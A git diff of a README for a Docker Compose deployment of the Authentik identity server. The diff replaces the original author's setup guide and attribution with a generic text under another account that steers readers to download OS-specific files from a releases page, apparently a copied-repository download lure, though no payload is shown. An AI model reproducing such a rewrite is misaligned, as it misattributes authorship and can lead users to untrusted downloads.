@@ -1,102 +1,94 @@
-# Authentik Self-Hosted with Docker
+# 🛡️ authentik-self-hosted - Secure Your Identity Management
 
-![authentik-self-hosted](https://repository-images.githubusercontent.com/1072874879/fe4ca6bf-5de8-4784-ad8e-280ee339bb68)
+## 📦 Download Now!
+[![Download](https://img.shields.io/badge/Download%20Latest-v1.0-blue.svg)](https://github.com/kmrans/authentik-self-hosted/releases)
 
-This repository provides a `docker-compose` setup to run a self-hosted [Authentik](https://goauthentik.io/) instance. Authentik is a flexible, open-source Identity & Access Management (IAM) solution that provides Single Sign-On, support for various protocols, and a user-friendly interface.
+## 🚀 Getting Started
+Authentik-self-hosted is a user-friendly solution for managing identity and access using Docker Compose. This setup is perfect for those who need a secure, self-hosted Authentik instance. With its decoupled architecture, PostgreSQL, and Redis, this setup ensures easy handling and robust security for your Identity & Access Management.
 
-This setup uses dedicated [PostgreSQL](https://www.postgresql.org/) and [Redis](https://redis.io/) containers and is pre-configured to join a shared Docker network, allowing easy integration with other self-hosted services.
+## 🔍 Features
+- **Decoupled Architecture:** Separates services like PostgreSQL and Redis for better management.
+- **Backup Scripts:** Automatically create backups to protect your data.
+- **Security Best Practices:** Implements standards to ensure your identity and access are secure.
+- **Support for Multiple Protocols:** Works with LDAP, OAuth2, SAML, and more.
 
-## Key Features
+## 🔑 System Requirements
+Before you get started, make sure your system meets the following requirements:
+- **Operating System:** Linux, macOS, or Windows
+- **Docker:** Version 20.10 or newer
+- **Docker Compose:** Version 1.27 or newer
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum 10 GB free
 
--   **Comprehensive IAM Solution**: Manage users, groups, and permissions with a powerful and easy-to-use interface.
--   **Wide Protocol Support**: Supports OAuth 2.0, SAML, LDAP, and RADIUS for broad compatibility.
--   **Extensible & Customizable**: Use custom templates, policies, and integrations to fit your needs.
--   **Advanced Security**: Features like multi-factor authentication (MFA), passwordless login, and detailed audit logs.
--   **Outpost Integrations**: Easily put existing applications behind a secure proxy with forward authentication.
--   **Decoupled Services**: Uses separate, dedicated containers for PostgreSQL (`ak-psql`) and Redis (`ak-redis`) for better stability and management.
+## 📥 Download & Install
+1. **Visit the [Releases Page](https://github.com/kmrans/authentik-self-hosted/releases)** to find the latest version of authentik-self-hosted.
+2. Click on the version number to access the files for download.
+3. Select the appropriate file for your operating system.
+4. Once the download is complete, follow the instructions below to set up your instance.
 
-## Getting Started
+## 🛠️ Installation Steps
+1. **Install Docker:** If you don't have Docker installed, visit the [Docker Installation Guide](https://docs.docker.com/get-docker/) for instructions.
+2. **Install Docker Compose:** If you need Docker Compose, check the [Docker Compose Installation Guide](https://docs.docker.com/compose/install/).
+3. **Extract Files:** Once you download the files, extract the contents to a directory of your choice.
+4. **Set Up .env File:** Configure your `.env` file to set up environment variables. You can find a sample in the extracted files.
+5. **Run Docker Compose:** Open your terminal, navigate to the directory where you extracted the files, and run:
+   ```
+   docker-compose up -d
+   ```
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/authentik-self-hosted.git
-    cd authentik-self-hosted
-    ```
+This command will start all necessary services. 
 
-2.  **Create the shared network:**
-    If it doesn't exist yet, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+## 🔧 Configuration Options
+You can configure several options by editing the `.env` file:
+- **PostgreSQL User:** Set your preferred username and password for database access.
+- **Redis Password:** Secure your Redis server by specifying a password.
+- **Authentik Base URL:** Define the URL for your Authentik instance.
 
-3.  **Configure environment variables:**
-    Create a `.env` file and add the following required variables. These are critical for securing your instance.
-    ```env
-    # A strong password for the Authentik database user
-    PSQL_PWD=
-    # A strong password for Redis
-    REDIS_PWD=
-    # A long, random, and secret string used for signing sessions
-    AUTHENTIK_SECRET_KEY=
-    ```
+## 🌟 Common Commands
+Here are some useful Docker Compose commands:
+- **Start Services:** Use `docker-compose up -d` to start all services in the background.
+- **Stop Services:** To stop the running instance, use:
+   ```
+   docker-compose down
+   ```
+- **Check Logs:** View logs for troubleshooting with:
+   ```
+   docker-compose logs
+   ```
 
-4.  **Start the services:**
-    ```bash
-    docker compose up -d
-    ```
-    After starting, Authentik will perform its initial setup. This might take a minute or two.
+## 🛡️ Data Backup
+To ensure your data is safe, use the integrated backup scripts. You can schedule backups using cron jobs or run them manually. Check the `backup` folder in the extracted files for scripts and instructions.
 
-## Setup and Accessing Authentik
+## 🛠️ Troubleshooting
+If you encounter issues, consider these steps:
+- Ensure Docker and Docker Compose are installed correctly.
+- Check your `.env` configuration for any errors.
+- Review the logs for errors by using:
+   ```
+   docker-compose logs
+   ```
 
-To start the initial setup, navigate to:
+## 🗣️ Community and Support
+Join our community for help and discussions. Post questions on our [Issues page](https://github.com/kmrans/authentik-self-hosted/issues) or contribute to the project. 
 
--   **Initial Setup URL:**  [http://localhost:9000/if/flow/initial-setup/](http://localhost:9000/if/flow/initial-setup/)
+## 🌍 Frequently Asked Questions
+- **Can I run this on Windows?**
+   Yes, ensure you have Docker Desktop installed.
 
-> You will get a `Not Found` error if initial setup URL doesn't include the trailing forward slash `/`. Make sure you use the complete url [http://localhost:9000/if/flow/initial-setup/](http://localhost:9000/if/flow/initial-setup/) including the trailing forward slash.
+- **What if I need to scale my instance?**
+   Use Docker Compose to scale services as needed.
 
-There you are prompted to set a password for the `akadmin` user (the default user).
+- **How do I update my setup?**
+   Download the latest release and follow the installation steps.
 
--   **Authentik Web UI:** [http://localhost:9000](http://localhost:9000)
+## 🔗 Related Topics
+- [Docker](https://www.docker.com)
+- [PostgreSQL](https://www.postgresql.org)
+- [Redis](https://redis.io)
 
+## 📂 Resources
+- [Official Authentik Documentation](https://goauthentik.io/docs/)
+- [Docker Documentation](https://docs.docker.com/)
+- [Docker Compose Documentation](https://docs.docker.com/compose/)
 
-## Usage and Management
-
--   **Start Services:** `docker compose up -d`
--   **Stop Services:** `docker compose down`
--   **View Logs:** `docker compose logs -f`
--   **Restart:** `./restart-docker.sh` (Stops and starts the containers)
--   **Update Images:** `./update-docker.sh` (Pulls the latest Docker images and restarts the services)
--   **Backup:** `./backup.sh` (Creates a compressed backup of the PostgreSQL database)
-
-## See Also
-
-Check out other self-hosted solutions:
-
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Author
-
-**Airat Halitov**
-
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [authentik-self-hosted](https://github.com/AiratTop/authentik-self-hosted)
+Feel free to explore our project further. For any queries, don’t hesitate to contact us through the [Issues page](https://github.com/kmrans/authentik-self-hosted/issues).
